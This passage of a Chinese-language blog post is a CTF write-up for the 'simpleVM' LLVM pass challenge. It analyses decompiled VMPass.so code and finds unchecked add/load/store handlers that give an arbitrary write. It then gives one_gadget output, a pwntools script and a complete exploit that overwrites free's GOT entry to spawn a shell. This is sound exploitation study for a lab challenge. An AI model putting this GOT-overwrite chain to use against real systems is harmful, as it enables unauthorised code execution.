)</span><br><span class="line">              *(_QWORD *)register1 = **(_QWORD **)register2;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_add = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_add = <span class="number">0LL</span>;</span><br><span class="line">            key_add = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_add);</span><br><span class="line">            <span class="keyword">if</span> ( key_add )</span><br><span class="line">            &#123;</span><br><span class="line">              op_add = llvm::ConstantInt::getZExtValue(key_add);</span><br><span class="line">              <span class="keyword">if</span> ( op_add == <span class="number">1</span> )</span><br><span class="line">                reg_add = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_add == <span class="number">2</span> )</span><br><span class="line">                reg_add = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_add )</span><br><span class="line">            &#123;</span><br><span class="line">              ArgOp_add2 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">              key_add2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_add2);</span><br><span class="line">              <span class="keyword">if</span> ( key_add2 )</span><br><span class="line">                *reg_add += llvm::ConstantInt::getZExtValue(key_add2);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ArgOp_min = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">          reg_min = <span class="number">0LL</span>;</span><br><span class="line">          key_min = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_min);</span><br><span class="line">          <span class="keyword">if</span> ( key_min )</span><br><span class="line">          &#123;</span><br><span class="line">            op_min = llvm::ConstantInt::getZExtValue(key_min);</span><br><span class="line">            <span class="keyword">if</span> ( op_min == <span class="number">1</span> )</span><br><span class="line">              reg_min = register1;</span><br><span class="line">            <span class="keyword">if</span> ( op_min == <span class="number">2</span> )</span><br><span class="line">              reg_min = register2;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( reg_min )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_min2 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">            key_min2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_min2);</span><br><span class="line">            <span class="keyword">if</span> ( key_min2 )</span><br><span class="line">              *reg_min -= llvm::ConstantInt::getZExtValue(key_min2);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Cpp 看得我好难受，连蒙带猜可以推断出它的意思：</p>
+<ul>
+<li>先从函数的第二个参数传入 BasicBlock</li>
+<li>通过 <code>llvm::Value::getName</code> 获取 name</li>
+<li>把 name 和各种命令进行对比：pop，push，add……</li>
+<li>紧接着就执行了 <code>llvm::CallBase::getArgOperand(v35, 0)</code> ，从名字来看，它获取了一个叫做 ArgOperand 的东西（看上去像是某种操作数）</li>
+<li>然后把 ArgOperand 作为参数，执行了 <code>llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_pop)</code> ，因为返回值的类型为 <code>llvm::ConstantInt *</code> ，看名字和“常量整数”有关，所以猜测这个函数和C语言中的 “atoi” 类似</li>
+<li>然后执行 <code>llvm::ConstantInt::getZExtValue(key_pop)</code> ，获取了整形的 ZExtValue，从后续的 if 语句来看，这个值极有可能是“1”或者“2”</li>
+<li>最后对比 op_command 的值，选择把 reg_command 赋值为 register1 或者 register2</li>
+</ul>
+<p>漏洞点如下：</p>
+<p>ADD 指令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( reg_add )</span><br><span class="line">&#123;</span><br><span class="line">  ArgOp_add2 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">  key_add2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_add2);</span><br><span class="line">  <span class="keyword">if</span> ( key_add2 )</span><br><span class="line">    *reg_add += llvm::ConstantInt::getZExtValue(key_add2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里匹配到 <code>add</code> 指令时，会根据其 “操作数1” 的值，来选择对应的 register，将 “操作数2” 累加上去</li>
+<li>可以通过 <code>add</code> 改变 register1 和 register2（它们的初始值为“0”）</li>
+</ul>
+<p>LOAD 指令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( reg_load == register1 )</span><br><span class="line">  *(_QWORD *)register2 = **(_QWORD **)register1;</span><br><span class="line"><span class="keyword">if</span> ( reg_load == register2 )</span><br><span class="line">  *(_QWORD *)register1 = **(_QWORD **)register2;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当匹配到 <code>load</code> 指令时，将对应的 register 中的值看做是地址，从该地址中取出8字节数据存入另一个 register 中（把二级指针中的数据放入一级指针中）</li>
+<li>register1 和 register2 的值完全由 <code>add</code> 控制，并且没有 <code>load</code> 中没有检查边界</li>
+</ul>
+<p>STORE 指令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( reg_store == register1 )</span><br><span class="line">&#123;</span><br><span class="line">  **(_QWORD **)register1 = *(_QWORD *)register2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( reg_store == register2 )</span><br><span class="line">&#123;</span><br><span class="line">  **(_QWORD **)register2 = *(_QWORD *)register1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当匹配到 <code>store</code> 指令时，就执行和 <code>load</code> 指令相反的操作，同样没有检查边界</li>
+<li>所以 <code>add</code>，<code>load</code>，<code>store</code> 相互配合，就可以实现 WAA</li>
+</ul>
+<p>入侵思路为：</p>
+<ul>
+<li>将 <code>opt-8</code> 二进制程序的 GOT 表中的 free 表项改为 one_gadget，即可获得 shell</li>
+</ul>
+<p>获取 one_gadget：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.2</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">➜  simpleVM one_gadget libc.so -l2</span><br><span class="line"><span class="number">0x4f365</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f3c2</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe56ff</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r14, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r14] == <span class="literal">NULL</span> || r14 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe58b8</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, [rbp<span class="number">-0x88</span>], [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [[rbp<span class="number">-0x88</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x88</span>] == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe58bf</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe58c3</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a45c</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a468</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [[rax]] == <span class="literal">NULL</span> || [rax] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
+<p>获取 free GOT 表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./opt-8&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./opt-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_got))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting local process <span class="string">&#x27;./opt-8&#x27;</span> argv=[<span class="string">&#x27;./opt-8&#x27;</span>] : pid <span class="number">3696</span></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/simpleVM/opt-8&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">[+] free_got &gt;&gt; <span class="number">0x77e100</span></span><br><span class="line">[*] Switching to interactive mode</span><br></pre></td></tr></table></figure>
+<p>完整 exp 为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>); <span class="comment">// 0x77e100: free_GOT</span></span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x72a9c</span>); <span class="comment">// 0x72a9c: one_gadget和free_addr之间的偏移</span></span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>add(1, 0x77e100)</code> 会在 register1 中写入 free_GOT</li>
+<li><code>load(1)</code> 会把 free_GOT 中的 free_addr（二级指针）装入 register2（一级指针）</li>
+<li><code>add(2, 0x72a9c)</code> 会把 register2 中的 free_addr 变为 one_gadget</li>
+<li><code>store(1)</code> 会把 register2 中的 one_gadget（一级指针），装入 register1 中的 free_GOT 中（二级指针）</li>
+</ul>
+<p>最后执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  simpleVM clang -emit-llvm -S <span class="built_in">exp</span>.c -o <span class="built_in">exp</span>.ll</span><br><span class="line">➜  simpleVM ./opt<span class="number">-8</span> -load ./VMPass.so -VMPass ./<span class="built_in">exp</span>.ll</span><br></pre></td></tr></table></figure>
+<ul>
+<li>PS：当我尝试利用 patchelf 修改 opt-8 的 libc 版本时，我遇到了各种各样的报错，最后还是没法解决，干脆就算了</li>
+</ul>
+<hr>
+<p><strong>小结：</strong></p>
+<p>这是我第一次搞 LLVM pwn，感觉就是 Cpp 的代码有点难看，程序逻辑还是可以理解</p>
+<p>我对于 LLVM 的理解是：</p>
+<ul>
+<li><strong>在执行优化操作之前，先把代码转化为 LLVM 的中间表示 IR，然后对 IR 进行优化，最后交给后端翻译为机器码</strong></li>
+</ul>
+<p>本题目的问题就出在 LLVM IR 的优化，也就是 LLVM pass</p>
+<p>用 IDA 分析发现：VMPass.so 有大量“指令函数”（add，load，store ……），这些函数就是优化的目标，漏洞也是在优化的过程中出现的</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/LLVM-pass-pwn/" rel="tag"><i class="fa fa-tag"></i> LLVM pass pwn</a>
+              <a href="/tags/cpp/" rel="tag"><i class="fa fa-tag"></i> cpp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/" rel="prev" title="C&Cpp杂谈（持续更新）">
+      <i class="fa fa-chevron-left"></i> C&Cpp杂谈（持续更新）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/06/Jemalloc+UAF+%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="next" title="Jemalloc+UAF+堆溢出">
+      Jemalloc+UAF+堆溢出 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
